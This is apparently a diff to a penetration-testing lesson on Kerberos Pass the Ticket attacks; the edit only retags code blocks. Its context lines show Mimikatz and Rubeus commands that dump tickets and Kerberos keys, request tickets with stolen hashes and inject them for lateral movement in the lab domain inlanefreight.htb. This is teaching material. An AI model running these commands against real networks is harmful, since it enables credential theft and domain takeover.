@@ -36,8 +36,7 @@ We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::
 
 #### Mimikatz - Export tickets
 
-```
-        cmd
+```bat
 c:\tools> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
@@ -106,8 +105,7 @@ We can also export tickets using `Rubeus` and the option `dump`. This option can
 
 #### Rubeus - Export tickets
 
-```
-        cmd
+```bat
 c:\tools> Rubeus.exe dump /nowrap
 
    ______        _
@@ -175,8 +173,7 @@ To forge our tickets, we need to have the user's hash; we can use Mimikatz to du
 
 #### Mimikatz - Extract Kerberos keys
 
-```
-        cmd
+```bat
 c:\tools> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
@@ -218,8 +215,7 @@ Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform
 
 #### Mimikatz - Pass the Key aka. OverPass the Hash
 
-```
-        cmd
+```bat
 c:\tools> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
@@ -261,8 +257,7 @@ To forge a ticket using `Rubeus`, we can use the module `asktgt` with the userna
 
 #### Rubeus - Pass the Key aka. OverPass the Hash
 
-```
-        cmd
+```bat
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 
    ______        _
@@ -309,8 +304,7 @@ With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket 
 
 #### Rubeus - Pass the Ticket
 
-```
-        cmd
+```bat
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    ______        _
   (_____ \      | |
@@ -371,8 +365,7 @@ Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
 
 #### Rubeus - Pass the Ticket
 
-```
-        cmd
+```bat
 c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 
  ______        _
@@ -402,8 +395,7 @@ We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to p
 
 #### Convert .kirbi to Base64 Format
 
-```
-        powershell
+```powershell
 PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 
 doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6...SNIP...
@@ -413,8 +405,7 @@ Using Rubeus, we can perform a Pass the Ticket providing the Base64 string inste
 
 #### Pass the Ticket - Base64 Format
 
-```
-        cmd
+```bat
 c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
  ______        _
 (_____ \      | |
@@ -443,8 +434,7 @@ Finally, we can also perform the Pass the Ticket attack using the Mimikatz modul
 
 #### Mimikatz - Pass the Ticket
 
-```
-        cmd
+```bat
 C:\tools> mimikatz.exe 
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
@@ -491,8 +481,7 @@ To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import o
 
 #### Mimikatz - Pass the Ticket for lateral movement.
 
-```
-        cmd
+```bat
 C:\tools> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -530,8 +519,7 @@ Rubeus has the option `createnetonly`, which creates a sacrificial process/logon
 
 #### Create a sacrificial process with Rubeus
 
-```
-        cmd
+```bat
 C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ______        _
   (_____ \      | |
@@ -559,8 +547,7 @@ The above command will open a new cmd window. From that window, we can execute R
 
 #### Rubeus - Pass the Ticket for lateral movement
 
-```
-        cmd
+```bat
 C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
    ______        _
   (_____ \      | |
